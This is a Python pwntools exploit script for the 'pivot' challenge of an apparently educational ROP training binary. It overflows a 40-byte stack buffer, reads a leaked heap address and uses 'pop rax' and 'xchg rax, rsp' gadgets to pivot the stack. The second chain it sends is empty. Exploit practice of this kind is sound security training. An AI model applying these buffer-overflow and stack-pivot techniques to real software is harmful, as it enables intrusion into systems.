from pwn import *

# stack offset to overwrite rip
stack_offset = 40

# gadgets
# -------
# 0x0000000000400b02: xchg rax, rsp; ret;
# 0x0000000000400b00: pop rax; ret;

xchgret = 0x000400b02
poprax = 0x000400b00

# run target
p = process("./pivot")

# wait for debugger
pid = util.proc.pidof(p)[0]
print "The pid is: "+str(pid)
util.proc.wait_for_debugger(pid)

# process interaction
p.recvuntil("Call ret2win() from libpivot.so")

# read heap address
heap_addr = p.recvline_contains("The Old Gods kindly bestow upon you a place to pivot:").strip().rsplit(' ', 1)[1]
heap_addr = u64(unhex(heap_addr[2:]).rjust(8, '\x00'), endian='big')
log.info("Heap address: 0x%x" % heap_addr)

# construct ropchains
# stack pivot chain
ropchain =  p64(poprax)
ropchain += p64(heap_addr)
ropchain += p64(xchgret)

buffer = "A"*stack_offset + ropchain

p.recvuntil("Send your second chain now and it will land there")
p.sendline()

p.recvuntil("Now kindly send your stack smash")
p.sendline(buffer)

p.interactive()
